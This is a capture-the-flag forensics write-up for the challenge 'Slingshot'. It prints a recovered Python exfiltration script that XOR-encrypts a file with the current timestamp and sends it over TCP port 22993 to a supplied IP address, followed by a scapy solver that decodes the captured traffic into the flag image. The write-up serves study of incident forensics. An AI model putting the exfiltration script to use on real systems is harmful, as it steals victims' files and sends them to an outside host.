# Slingshot
## Description
> We have recently suffered a data breach, and we need help figuring out if any data was stolen. Can you investigate this pcap file and see if there is any evidence of data exfiltration and if possible, what was stolen.

```py
download.pyc

import sys
import socket
import time
import math
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
file = sys.argv[1]
ip = sys.argv[2]
port = 22993
with open(file, 'rb') as r:
    data_bytes = r.read()
current_time = time.time()
current_time = math.floor(current_time)
key_bytes = str(current_time).encode('utf-8')
init_key_len = len(key_bytes)
data_bytes_len = len(data_bytes)
temp1 = data_bytes_len // init_key_len
temp2 = data_bytes_len % init_key_len
key_bytes *= temp1
key_bytes += key_bytes[:temp2]
encrypt_bytes = bytes((a ^ b for a, b in zip(key_bytes, data_bytes)))
s.connect((ip, port))
s.send(encrypt_bytes)
```

```py
from pwn import xor
from scapy.all import *

packets = rdpcap('Slingshot.pcapng')
data_bytes = bytearray()

for packet in packets:
    if hasattr(packet, 'dport') and packet.dport == 22993:  # Ensure dport exists before checking
        if packet.haslayer(Raw):
            if len(packet.load) > 1:
                # Convert the timestamp to an integer, then to bytes
                key_bytes = str(int(packet.time)).encode()  # Ensure key is in byte format
                data_bytes.extend(packet.load)

# XOR the captured data with the key
output = xor(data_bytes, key_bytes)

# Write the result to the file
with open('flag.jpg', 'wb') as f:
    f.write(output)
```

### Summary of Steps:
- Read the packets from the capture file (Slingshot.pcapng).
- Filter packets that go to port 22993.
- Extract the raw payloads from these packets and append them to data_bytes.
- Convert the packet timestamp into bytes to use as a key.
- XOR the collected data payloads with the key.
- Save the result (which could be an image, e.g., flag.jpg) to a file.


![flag](https://github.com/user-attachments/assets/d93d4121-6a3b-4263-b80d-e4fc5d2a145c)
